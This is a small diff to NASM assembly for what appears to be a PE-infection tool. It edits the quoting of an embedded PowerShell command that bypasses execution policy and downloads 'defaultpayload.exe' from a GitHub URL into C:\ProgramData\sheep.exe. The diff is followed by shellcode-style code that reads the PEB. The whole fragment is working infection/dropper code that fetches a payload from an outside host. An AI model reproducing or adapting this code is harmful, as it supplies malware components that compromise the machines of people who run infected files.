@@ -26,8 +26,8 @@ infection__data__sheep:
    db "C:\\ProgramData\\sheep.exe",0
 infection__data__powershell:
    db "powershell -ExecutionPolicy bypass "
-   db "-Command \"(New-Object System.Net.WebClient).DownloadFile("
-   db "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')\"",0
+   db "-Command ", 34, "(New-Object System.Net.WebClient).DownloadFile(" ; nasm strings, lol
+   db "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')", 34, 0
 infection__data:
    pop rbx                      ; get the pointer to the start of the data
    mov rax, [gs:0x60]           ; get current PEB
